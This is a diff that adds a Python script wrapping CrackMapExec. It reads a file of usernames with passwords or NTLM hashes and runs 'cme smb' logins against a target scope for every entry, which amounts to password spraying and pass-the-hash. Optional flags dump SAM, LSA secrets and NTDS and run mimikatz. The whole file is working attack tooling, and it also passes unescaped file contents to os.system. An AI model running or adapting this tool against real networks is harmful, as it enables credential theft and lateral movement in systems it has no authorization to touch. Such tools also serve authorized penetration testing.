@@ -1,0 +1,89 @@
+#!/usr/bin/env python3
+#------------------------
+# Coded by: WYATT BECKER
+#------------------------
+import os
+import argparse
+from time import sleep
+import re # To remove substrings of bad characters if taken directly from cme output
+#TODO: count colons in cred and clean to user:LM format if given amount of colons == NTLM
+# Or just clean full NTLMs instead of LMs from the get go.
+# Make commands transparent. Haven't checked if they're already in ouptut yet.
+
+# Help menu
+parser = argparse.ArgumentParser(description='''Iteration tool for cme. Cred file must be in user:pass or user:LM format''')
+parser.add_argument('-c', action='store', dest='cred_file',
+                    help="Credential file")
+parser.add_argument('-s', action='store', dest='scope',
+                    help="Scope file / ip address")
+parser.add_argument('-option', action='store', dest='option',
+                    help="Add custom option")
+parser.add_argument('--sam', action='store_true', dest='sam',
+                    help="Dump Sam File")
+parser.add_argument('--mimikatz', action='store_true', dest='mimi',
+                    help="Use Mimikatz")
+parser.add_argument('--lsa', action='store_true', dest='lsa',
+                    help="Dump LSA Secrets")
+parser.add_argument('--ntds', action='store_true', dest='ntds',
+                    help="Dump NTDS")
+parser.add_argument('--local-auth', action='store_true', dest='local_auth',
+                    help="Use local authentication")
+parser.add_argument('--shares', action='store_true', dest='shares',
+                    help="View network shares")
+results = parser.parse_args()
+
+# Initializing the variables
+sam = ""
+mimi = ""
+lsa = ""
+ntds = ""
+local_auth = ""
+shares = ""
+option = ""
+# Add strings to variables if coinciding arguments are used.
+if results.sam:
+    sam=" --sam"
+if results.mimi:
+    mimi=" -M mimikatz"
+if results.lsa:
+    lsa=" --lsa"
+if results.ntds:
+    ntds=" --ntds"
+if results.local_auth:
+    local_auth=" --local-auth"
+if results.shares:
+    shares=" --shares"
+if results.option:
+    option=results.option
+# Print help if required arguments are not pr
+if not results.cred_file or not results.scope:
+     parser.print_help() # show helpmenu/syntax
+     print()
+     print("scope file (-s) and credential file (-c) must be provided in arguments")
+     print()
+     exit()
+# Go through cred file seperating usernames and passwords using : as dilimiter
+with open(results.cred_file) as f:
+    for line in f:
+        try:
+            credential=re.sub('\\[0m$', '', line)	# remove bad chars
+            credential=credential.split(":")
+            passwd=credential[1].strip()
+            user=credential[0].strip()
+        except:
+            print("Bad Credential.. PASSING")
+            pass
+        try: # Check if pass is < 14 characters, if not, treat as hash.
+            if len(passwd)<14:
+            #    sleep(.5) # pause to allow for keyboardInterrupt. Needs further testing.
+                print("cme smb " + results.scope + " -u '" + user + "' -p '" + passwd + "'"+shares+local_auth+sam+lsa+ntds+mimi+option)
+                os.system("cme smb " + results.scope + " -u '" + user + "' -p '" + passwd + "'"+shares+local_auth+sam+lsa+ntds+mimi+option)
+                sleep(.25)
+            else:
+            #    sleep(.5)
+                print("cme smb " + results.scope + " -u '" + user + "' -H '" + passwd + "'"+shares+local_auth+sam+lsa+ntds+mimi+option)
+                os.system("cme smb " + results.scope + " -u " + user + " -H '" + passwd + "'"+shares+local_auth+sam+lsa+ntds+mimi+option)
+                sleep(.25)
+        except KeyboardInterrupt:
+            print("You stopped the program...")
+            exit()
